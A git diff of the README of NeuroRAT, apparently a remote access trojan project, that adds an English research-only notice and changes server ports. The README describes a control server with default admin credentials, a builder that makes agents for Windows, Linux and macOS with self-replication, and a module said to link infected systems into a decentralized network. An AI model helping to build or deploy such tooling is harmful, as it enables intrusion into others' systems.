@@ -2,11 +2,29 @@
 
 ![NeuroRAT Logo](docs/images/logo.svg)
 
-## ⚠️ СЕРЬЕЗНОЕ ПРЕДУПРЕЖДЕНИЕ ⚠️
+<div align="center">
 
-**ДАННЫЙ ПРОЕКТ ЯВЛЯЕТСЯ СТРОГО ИССЛЕДОВАТЕЛЬСКИМ. СОЗДАН И ОПУБЛИКОВАН ИСКЛЮЧИТЕЛЬНО В НАУЧНЫХ И ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЯХ В РАМКАХ ПРИВАТНЫХ РЕПОЗИТОРИЕВ. ИСПОЛЬЗОВАНИЕ ДАННОГО КОДА В ЛЮБЫХ НЕЗАКОННЫХ ЦЕЛЯХ ЯВЛЯЕТСЯ УГОЛОВНЫМ ПРЕСТУПЛЕНИЕМ.**
+```
+██╗    ██╗ █████╗ ██████╗ ███╗   ██╗██╗███╗   ██╗ ██████╗ 
+██║    ██║██╔══██╗██╔══██╗████╗  ██║██║████╗  ██║██╔════╝ 
+██║ █╗ ██║███████║██████╔╝██╔██╗ ██║██║██╔██╗ ██║██║  ███╗
+██║███╗██║██╔══██║██╔══██╗██║╚██╗██║██║██║╚██╗██║██║   ██║
+╚███╔███╔╝██║  ██║██║  ██║██║ ╚████║██║██║ ╚████║╚██████╔╝
+ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
+```
 
-**СПЕЦИАЛЬНОЕ ПРЕДУПРЕЖДЕНИЕ:** Модуль `swarm_intelligence.py` содержит потенциально опасный код, который теоретически позволяет объединить все инфицированные системы в единую децентрализованную сеть. **КАТЕГОРИЧЕСКИ ЗАПРЕЩАЕТСЯ** активировать данный модуль вне строго контролируемой исследовательской среды. Этот модуль предназначен исключительно для демонстрации теоретических возможностей децентрализованных атак и разработки соответствующих защитных механизмов.
+</div>
+
+```console
+[!] SECURITY NOTICE [!]
+--------------------
+This project is strictly RESEARCH-ORIENTED. Created and published 
+exclusively for scientific and educational purposes in private repositories.
+
+ANY USE OF THIS CODE FOR ILLEGAL PURPOSES IS A CRIMINAL OFFENSE.
+```
+
+> **CRITICAL WARNING**: The `swarm_intelligence.py` module contains potentially dangerous code that theoretically enables the unification of all infected systems into a single decentralized network. It is **STRICTLY PROHIBITED** to activate this module outside a tightly controlled research environment. This module is intended exclusively for demonstrating theoretical capabilities of decentralized attacks and developing appropriate defense mechanisms.
 
 ## Overview
 
@@ -69,7 +87,7 @@ pip3 install fastapi uvicorn jinja2 python-multipart pillow psutil
 python3 server_api.py
 ```
 
-После запуска сервер будет доступен по адресу http://localhost:8088
+После запуска сервер будет доступен по адресу http://localhost:8080
 - Логин: `admin`
 - Пароль: `neurorat`
 
@@ -91,7 +109,7 @@ python3 server_api.py
 
 ## Билдер и саморепликация
 
-Доступ к билдеру: http://localhost:8088/builder
+Доступ к билдеру: http://localhost:8080/builder
 
 Билдер позволяет:
 1. Создавать настроенных агентов для Windows, Linux и macOS
@@ -108,7 +126,7 @@ python3 server_api.py
 Для использования в контейнере (только для тестирования и разработки):
 ```bash
 docker build -t neurorat .
-docker run -p 8088:8088 neurorat
+docker run -p 8080:8080 -p 5050:5000 neurorat
 ```
 
 ## Структура проекта
